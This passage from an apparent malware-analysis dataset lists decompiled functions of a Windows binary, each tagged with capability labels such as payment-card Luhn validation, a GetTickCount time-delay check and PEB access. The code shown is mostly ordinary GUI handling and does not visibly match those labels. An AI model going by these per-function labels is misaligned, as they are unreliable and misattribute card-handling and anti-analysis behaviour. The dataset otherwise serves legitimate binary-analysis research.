        "decompiled_code": "\nint32_t __cdecl fcn.0043b238(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 0x18) = arg_8h;\n    *(in_EAX + 10) = 0x50;\n    *(in_EAX + 8) = 8;\n    *(in_EAX + 0x1c) = 1;\n    *(in_EAX + 0x20) = 10;\n    *(in_EAX + 0x40) = 4;\n    *(in_EAX + 0x3c) = 0xc;\n    *(in_EAX + 0x28) = 0xff000014;\n    *(in_EAX + 0x2c) = 1;\n    *(in_EAX + 0x44) = 1;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 324
    },
    "0043bdd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043bdd8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00452964();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x43be4c;\n    uVar1 = fcn.0043b238(0);\n    *(in_EAX + 0x250) = uVar1;\n    uVar2 = 1;\n    uVar1 = fcn.0043b238(1);\n    *(in_EAX + 0x254) = uVar1;\n    *(in_EAX + 600) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 252
    },
    "0043c1c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c1c4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_stack_ffffffd0;\n    int32_t iVar6;\n    int32_t in_stack_ffffffd4;\n    int32_t iVar7;\n    int32_t in_stack_ffffffd8;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    if (param_2 != NULL) {\n        (**(*param_2 + 0x44))();\n        uVar1 = *(*(in_EAX + 0x250) + 0x1a);\n        uVar2 = *(*(in_EAX + 0x254) + 0x1a);\n        fcn.0044f754(in_stack_ffffffd0 - uVar1, in_stack_ffffffd4 - uVar2, in_stack_ffffffd8 + uVar1, \n                     in_stack_ffffffdc + uVar2);\n        fcn.0044f804();\n        iVar5 = iStack32;\n        iVar7 = iStack28;\n        fcn.0044f754();\n        fcn.0044f804();\n        if (iVar5 < 0) {\n            fcn.0043ba34();\n        }\n        else {\n            iVar6 = iVar5;\n            iVar3 = fcn.0044f640();\n            if (iVar3 < iStack32) {\n                iVar3 = iStack32;\n                iVar4 = fcn.0044f640();\n                if (iVar4 < iStack32 - iVar5) {\n                    iVar3 = fcn.0044f640();\n                    iVar3 = iVar3 + iVar6;\n                }\n                fcn.0044f640(iVar6, iVar7, iVar3);\n                fcn.0043ba34();\n            }\n        }\n        if (iVar7 < 0) {\n            fcn.0043ba34();\n        }\n        else {\n            iVar5 = fcn.0044f684();\n            if (iVar5 < iStack28) {\n                iVar5 = fcn.0044f684();\n                if (iVar5 < iStack28 - iVar7) {\n                    fcn.0044f684();\n                }\n                fcn.0044f684();\n                fcn.0043ba34();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 566
    },
    "0043c3e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043c3e4(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    in_EAX[0x97] = in_EAX[0x97] + 1;\n    uStack24 = 0x43c450;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00455e78();\n    (**(*in_EAX + 0xe0))();\n    *in_FS_OFFSET = uStack28;\n    in_EAX[0x97] = in_EAX[0x97] + -1;\n    return;\n}\n",
        "token_count": 181
    },
    "0043c59c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c59c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = *(param_2 + 4);\n    uStack24 = 0x43c5fd;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    var_8h = param_2;\n    cVar1 = fcn.004047cc();\n    if (cVar1 == '\\0') {\n        *(var_8h + 4) = 1;\n    }\n    fcn.00456d74();\n    *in_FS_OFFSET = uStack28;\n    *(var_8h + 4) = var_ch;\n    return;\n}\n",
        "token_count": 222
    },
    "0043c62c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043c62c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea4;\n    uint *arg_ch;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uchar *puStack316;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10h;\n    uint var_ch;\n    int32_t *var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack304 = 0x43c64a;\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uStack308 = 0x43c790;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec8;\n    puStack316 = 0x43c66c;\n    puStack304 = &stack0xfffffffc;\n    var_5h._0_1_ = param_2;\n    unique0x100000eb = in_EAX;\n    (**(***0x492ac4 + 0x14))();\n    uStack320 = 0x43c770;\n    uStack324 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffebc;\n    uStack328 = 0;\n    puStack332 = 0x43c68b;\n    puStack316 = &stack0xfffffffc;\n    (**(*stack0xfffffff8 + 0xf0))();\n    puStack332 = 0x43c693;\n    iVar2 = fcn.00404518();\n    if ((iVar2 != *0x439700) && ((*(stack0xfffffff8 + 7) & 0x10) == 0)) {\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) | 1;\n        uStack336 = 0x43c738;\n        uStack340 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffeac;\n        puStack332 = &stack0xfffffffc;\n        cVar1 = fcn.00419598();\n        if (cVar1 == '\\0') {\n            fcn.00404520();\n            var_10h = &fcn.0043c62c::var_110h;\n            var_ch._0_1_ = 4;\n            arg_ch = &fcn.0043c62c::var_10h;\n            in_stack_fffffea4 = 0;\n            fcn.004075f4();\n            fcn.0040daac(in_stack_fffffea4, arg_ch);\n            fcn.00404eb4();\n        }\n        *in_FS_OFFSET = in_stack_fffffea4;\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) & 0xfe;\n        return;\n    }\n    *in_FS_OFFSET = uStack328;\n    uStack320 = 0x43c777;\n    uStack324 = 0x43c76f;\n    (**(***0x492ac4 + 0x18))();\n    return;\n}\n",
        "token_count": 783
    },
    "0043d650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d650(code *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00457f90(arg_8h, arg_ch);\n    if ((in_EAX == in_EDX) && (var_8h = fcn.0041fe78(),  -1 < var_8h + -1)) {\n        do {\n            fcn.0041fe4c();\n            cVar1 = fcn.0040483c();\n            if (cVar1 == '\\0') {\n                (*arg_8h)();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "0044133c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044133c(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    \n    uVar1 = (*in_EAX + in_ECX) - in_EDX;\n    uVar2 = uVar1 >> 0x1f;\n    if ((uVar1 ^ uVar2) - uVar2 < *(*(arg_8h + -4) + 0x34c)) {\n        *in_EAX = in_EDX - in_ECX;\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00441f24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00441f24(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x441f91;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    cVar1 = (**(*in_EAX + 0xf4))();\n    if (cVar1 != '\\0') {\n        fcn.0040483c();\n        if ((cVar1 != '\\0') == true) {\n            fcn.00442098();\n        }\n    }\n    else {\n        in_EAX[0xa5] = 0;\n    }\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 200
    },
    "00442c08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442c08(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = fcn.004563dc();\n    *arg_8h = iVar1 == 0;\n    return;\n}\n",
        "token_count": 65
    },
    "00442e84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00442e84(void)\n\n{\n    uint uStack20;\n    \n    fcn.00442eec();\n    return uStack20;\n}\n",
        "token_count": 34
    },
    "00442e9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00442e9c(void)\n\n{\n    int32_t iStack16;\n    int32_t iStack8;\n    \n    fcn.00442eec();\n    return iStack8 - iStack16;\n}\n",
        "token_count": 51
    },
    "00442eb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00442eb8(void)\n\n{\n    uint uStack16;\n    \n    fcn.00442eec();\n    return uStack16;\n}\n",
        "token_count": 34
    },
    "00442ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00442ed0(void)\n\n{\n    int32_t iStack20;\n    int32_t iStack12;\n    \n    fcn.00442eec();\n    return iStack12 - iStack20;\n}\n",
        "token_count": 50
    },
    "00442eec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442eec(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    uStack52 = 0x28;\n    (***0x492724)(*(in_EAX + 4));\n    *param_2 = &uStack52;\n    *(param_2 + 4) = uStack52;\n    *(param_2 + 8) = uStack48;\n    *(param_2 + 0xc) = uStack44;\n    return;\n}\n",
        "token_count": 134
    },
    "00442f1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442f1c(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint auStack52 [3];\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    auStack52[0] = 0x28;\n    (***0x492724)(*(in_EAX + 4), auStack52);\n    *param_2 = uStack40;\n    param_2[1] = uStack36;\n    param_2[2] = uStack32;\n    param_2[3] = uStack28;\n    return;\n}\n",
        "token_count": 148
    },
    "004436c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004436c0(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t aiStack28 [3];\n    \n    piVar6 = aiStack28;\n    if (param_2 != *(in_EAX + 0x44)) {\n        *(in_EAX + 0x44) = param_2;\n        if (param_2 == 0) {\n            sub.user32.dll_GetCursorPos(aiStack28);\n            iVar1 = sub.user32.dll_WindowFromPoint(piVar6, aiStack28[0]);\n            if (iVar1 != 0) {\n                iVar2 = func_0x004082bc(iVar1, 0);\n                iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n                if (iVar2 == iVar3) {\n                    uVar4 = sub.user32.dll_SendMessageA(iVar1, 0x84, 0, piVar6 & 0xffff | aiStack28[0] << 0x10);\n                    sub.user32.dll_SendMessageA(iVar1, 0x20, iVar1, uVar4 & 0xffff | 0x2000000);\n                    return;\n                }\n            }\n        }\n        uVar5 = fcn.00443698();\n        sub.user32.dll_SetCursor(uVar5);\n    }\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) + 1;\n    return;\n}\n",
        "token_count": 369
    },
    "004438e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004438e0(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = 0;\n    if (param_1 == '\\x01') {\n        iVar2 = fcn.0043d3d4();\n        uVar1 = fcn.0043d3d4();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x02') {\n        iVar3 = fcn.0043d3d4();\n        iVar2 = *(param_2 + 0x4c);\n        iVar4 = fcn.0043d3d4();\n        uVar1 = iVar4 + *(in_EAX + 0x4c);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x03') {\n        iVar2 = fcn.0043d3b4();\n        uVar1 = fcn.0043d3b4();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x04') {\n        iVar3 = fcn.0043d3b4();\n        iVar2 = *(param_2 + 0x48);\n        iVar4 = fcn.0043d3b4();\n        uVar1 = iVar4 + *(in_EAX + 0x48);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 408
    },
    "00443ccc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00443ccc(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack28 = 0x443ce1;\n    cVar1 = fcn.00443c74(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        fcn.00404610();\n        uStack28 = 0x443d46;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        fcn.00443b24(&stack0xfffffffc);\n        fcn.00443b24(&stack0xfffffffc);\n        fcn.00443b24(&stack0xfffffffc);\n        fcn.00443b24(&stack0xfffffffc);\n        fcn.00443b24(&stack0xfffffffc);\n        *in_FS_OFFSET = uStack32;\n        uStack28 = 0x443d45;\n        fcn.00404640();\n        return;\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "00444930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00444930(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t var_4h;\n    \n    iVar1 = sub.user32.dll_GetWindow(arg_8h, 4);\n    if ((iVar1 == 0) || (iVar1 == *(*0x497c14 + 0x30))) {\n        var_4h = 0;\n    }\n    else {\n        sub.user32.dll_GetWindowThreadProcessId(iVar1, &var_4h);\n    }\n    iVar2 = sub.kernel32.dll_GetCurrentProcessId();\n    if (iVar2 == var_4h) {\n        iVar2 = fcn.00419834();\n        if (iVar2 < 0) {\n            fcn.00419680();\n        }\n    }\n    if ((((iVar1 != 0) && (arg_8h != *(*0x497c14 + 0x30))) && (iVar1 == *(*0x497c14 + 0x30))) && (arg_8h != arg_ch)) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00406858();\n            fcn.00406a14(iVar1 + 1);\n            iVar1 = fcn.00406858();\n            *(*0x497c38 + -4 + iVar1 * 4) = arg_8h;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 341
    },
    "00444c98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444c98(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpPaint;\n    \n    uVar1 = sub.user32.dll_BeginPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    uVar2 = fcn.0044538c();\n    sub.user32.dll_DrawIcon(uVar1, 0, 0, uVar2);\n    sub.user32.dll_EndPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    return;\n}\n",
        "token_count": 134
    },
    "0044570c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044570c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_stack_ffffffcc;\n    uchar *puVar5;\n    uchar *puStack28;\n    uchar auStack24 [8];\n    \n    uVar4 = 0;\n    if ((0xff < param_2[1]) && (param_2[1] < 0x10a)) {\n        puStack28 = 0x445737;\n        iVar2 = sub.user32.dll_GetCapture();\n        if (iVar2 == 0) {\n            iVar2 = *param_2;\n            if ((*(in_EAX + 0x44) == 0) || (iVar2 != *(*(in_EAX + 0x44) + 0x29c))) {\n                while( true ) {\n                    cVar1 = fcn.0044c780();\n                    if ((cVar1 != '\\0') || (iVar2 == 0)) break;\n                    iVar2 = sub.user32.dll_GetParent();\n                }\n                if (iVar2 == 0) {\n                    iVar2 = *param_2;\n                }\n            }\n            else {\n                puStack28 = 0x445753;\n                iVar2 = fcn.00457a28();\n            }\n            iVar3 = sub.user32.dll_IsWindowUnicode(iVar2);\n            if (iVar3 == 0) {\n                in_stack_ffffffcc = param_2[1] + 0xbc00;\n                iVar2 = func_0x00408444(iVar2, in_stack_ffffffcc, param_2[2], param_2[3]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n            else {\n                in_stack_ffffffcc = param_2[1] + 0xbc00;\n                iVar2 = sub.user32.dll_SendMessageW(iVar2, in_stack_ffffffcc, param_2[2], param_2[3]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n        else {\n            puStack28 = &stack0xffffffe8;\n            sub.user32.dll_GetWindowThreadProcessId(iVar2);\n            puVar5 = *(in_EAX + 0x30);\n            sub.user32.dll_GetWindowThreadProcessId();\n            if (puVar5 == &stack0xffffffe4) {\n                in_stack_ffffffcc = param_2[1] + 0xbc00;\n                iVar2 = sub.user32.dll_SendMessageA(iVar2, in_stack_ffffffcc, param_2[2], param_2[3]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n    }\n    return CONCAT44(in_stack_ffffffcc, uVar4);\n}\n",
        "token_count": 654
    },
    "00445a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00445a50(void)\n\n{\n    char cVar1;\n    \n    do {\n        cVar1 = fcn.0044593c();\n    } while (cVar1 != '\\0');\n    return;\n}\n",
        "token_count": 50
    },
    "00445a68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00445a68(void)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.0044593c();\n    if (cVar1 == '\\0') {\n        fcn.0044630c();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "00445b78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00445b78(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint8_t uStack520;\n    \n    uVar1 = fcn.00404518();\n    while (uVar2 = uVar1,  uVar1 != 0) {\n        fcn.00404520();\n        fcn.00404520();\n        bVar3 = uStack520 == 0xffffffff;\n        uVar2 = fcn.00403a04();\n        if (bVar3) break;\n        uVar1 = fcn.004045cc();\n    }\n    return uVar2 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 161
    },
    "00446280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00446280(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack12 [8];\n    \n    sub.user32.dll_GetCursorPos(auStack12);\n    iVar1 = fcn.0044e23c();\n    if (iVar1 != *(in_EAX + 0x48)) {\n        *(in_EAX + 0x48) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "00446828": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00446828(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack12 [8];\n    \n    fcn.004466e0();\n    if (*(in_EAX + 0x89) == '\\0') {\n        sub.user32.dll_GetCursorPos(auStack12);\n        fcn.00446b74();\n    }\n    else if (*(in_EAX + 0x89) == '\\x01') {\n        fcn.00446860();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00447498": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00447498(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 4) = param_1;\n    *(in_EAX + 0xc) = 0;\n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0;\n    *(in_EAX + 0x18) = 0;\n    *(in_EAX + 0x28) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 236
    },
    "00447a78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00447a78(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint var_18h;\n    uint hdc;\n    int32_t var_4h;\n    \n    uStack36 = 0;\n    puStack40 = 0x447a89;\n    var_4h = in_EAX;\n    hdc = sub.user32.dll_GetDC();\n    uStack44 = 0x447b19;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piVar1 = *(var_4h + 0x50);\n    puStack40 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap(hdc, *(var_4h + 0x34), *(var_4h + 0x30));\n    fcn.00429d70();\n    fcn.0042915c();\n    fcn.0042482c();\n    arg_ch = (**(*piVar1 + 0x20))();\n    arg_8h = &fcn.00447a78::var_18h;\n    (**(*piVar1 + 0x2c))();\n    fcn.00418388(arg_8h, arg_ch);\n    fcn.0042915c(&fcn.00447a78::var_18h);\n    fcn.00424bd0();\n    *in_FS_OFFSET = arg_8h;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x447b20);\n    return;\n}\n",
        "token_count": 389
    },
    "00447b3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447b3c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = *(in_EAX + 0x34);\n    uStack12 = *(in_EAX + 0x30);\n    puVar1 = &uStack8;\n    sub.comctl32.dll_ImageList_GetIconSize(param_2, puVar1, &uStack12);\n    *(in_EAX + 0x34) = puVar1;\n    *(in_EAX + 0x30) = param_2;\n    fcn.00447a78();\n    return;\n}\n",
        "token_count": 160
    },
    "00447cdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00447cdc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x447cf7;\n    fcn.00428b88();\n    uStack36 = 0x447d8b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x447d14;\n    puStack32 = &stack0xfffffffc;\n    fcn.00428b88();\n    uStack48 = 0x447d6e;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.00447a6c();\n    uVar1 = fcn.00447bb0();\n    uVar2 = fcn.00447bb0(uVar1);\n    uVar1 = *(in_EAX + 0x3c);\n    sub.comctl32.dll_ImageList_Add(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.00404640(0x447d75);\n    return;\n}\n",
        "token_count": 338
    },
    "004485d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004485d8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != NULL) {\n        puStack32 = 0x4485f0;\n        iVar1 = fcn.00447da8();\n        puStack32 = 0x4485f9;\n        iVar2 = fcn.00447da8();\n        if (iVar1 == iVar2) {\n            puStack32 = 0x44860d;\n            iVar1 = fcn.00447da8();\n            if (iVar1 != 0) {\ncode_r0x00448625:\n                puStack32 = 0x448631;\n                fcn.00404610();\n                uStack36 = 0x4486b4;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x44864c;\n                puStack32 = &fcn.004485d8::var_1h + 1;\n                (**(*in_EAX + 0x3c))();\n                puStack44 = 0x448658;\n                fcn.00404610();\n                uStack48 = 0x448697;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.004485d8::var_1h + 1;\n                (**(*param_2 + 